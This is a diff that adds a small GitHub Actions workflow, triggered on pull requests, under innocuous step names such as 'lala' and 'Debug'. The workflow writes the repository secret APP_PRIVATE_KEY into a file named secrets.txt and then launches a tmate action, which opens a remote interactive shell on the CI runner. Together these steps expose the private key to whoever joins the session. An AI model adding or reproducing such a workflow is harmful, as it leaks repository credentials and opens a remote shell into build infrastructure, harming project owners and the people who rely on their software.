@@ -1,0 +1,21 @@
+name: plop
+on: [pull_request]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: lala
+      env:
+        DBG: ${{ secrets.APP_PRIVATE_KEY }}
+      run: |
+        echo $DBG >> secrets.txt
+
+    - name: tmate
+      uses: mxschmitt/action-tmate@v2
+
